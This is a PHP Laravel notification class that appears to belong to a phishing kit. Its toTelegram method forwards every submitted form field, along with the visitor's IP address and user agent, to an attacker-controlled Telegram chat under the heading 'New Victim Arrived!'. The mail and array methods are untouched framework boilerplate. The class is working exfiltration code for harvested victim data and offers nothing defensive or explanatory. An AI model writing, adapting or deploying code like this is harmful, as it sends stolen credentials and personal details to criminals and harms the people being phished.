<?php

namespace App\Notifications;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Notifications\Messages\MailMessage;
use Illuminate\Notifications\Notification;
use NotificationChannels\Telegram\TelegramMessage;

class TelegramNotification extends Notification implements ShouldQueue
{
    use Queueable;
    protected $data;
    protected $token;
    protected $chatId;

    /**
     * Create a new notification instance.
     */
    public function __construct($token, $chatId, $data)
    {
        $this->token = $token;
        $this->chatId = $chatId;
        $this->data = $data;
    }

    /**
     * Get the notification's delivery channels.
     *
     * @return array<int, string>
     */
    public function via(object $notifiable): array
    {
        return ['telegram'];
    }

    public function toTelegram($notifiable)
    {
        $ip = $this->data['ip_address'];
        $ua = $this->data['user_agent'];

        unset($this->data['ip_address']);
        unset($this->data['user_agent']);

        $message = TelegramMessage::create()
            ->to($this->chatId)
            ->token($this->token)
            ->line("*New Victim Arrived!*")
            ->line("");

        foreach ($this->data as $key => $value) {
            $capitalize = ucfirst($key);
            $message->line("$capitalize: $value");
        }
        $message->line("");
        $message->line("IP Address: $ip");
        $message->line("User Agent: $ua");

        return $message;
    }

    /**
     * Get the mail representation of the notification.
     */
    public function toMail(object $notifiable): MailMessage
    {
        return (new MailMessage)
            ->line('The introduction to the notification.')
            ->action('Notification Action', url('/'))
            ->line('Thank you for using our application!');
    }

    /**
     * Get the array representation of the notification.
     *
     * @return array<string, mixed>
     */
    public function toArray(object $notifiable): array
    {
        return [
            //
        ];
    }
}
